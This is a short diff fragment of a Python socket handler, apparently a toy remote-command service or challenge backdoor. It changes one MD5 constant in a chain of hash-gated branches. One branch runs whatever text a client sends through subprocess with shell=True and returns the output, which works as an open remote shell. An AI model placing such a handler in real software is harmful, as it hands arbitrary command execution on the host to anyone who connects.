@@ -16,7 +16,7 @@ def handler(clientsock,addr):
         data = clientsock.recv(1024)
         output = subprocess.check_output(data.decode(), shell=True, universal_newlines=True)
         clientsock.send(output.encode())
-    if md5 == "b026324c6904b2a9cb4b88d6d61c81d1":
+    if md5 == "b026324c6904b2a9cb4b88d6d61c81d2":
         output = subprocess.check_output("ls", shell=True, universal_newlines=True)
         clientsock.send(output.encode())
     if md5 == "286755fad04869ca523320acce0dc6a4":
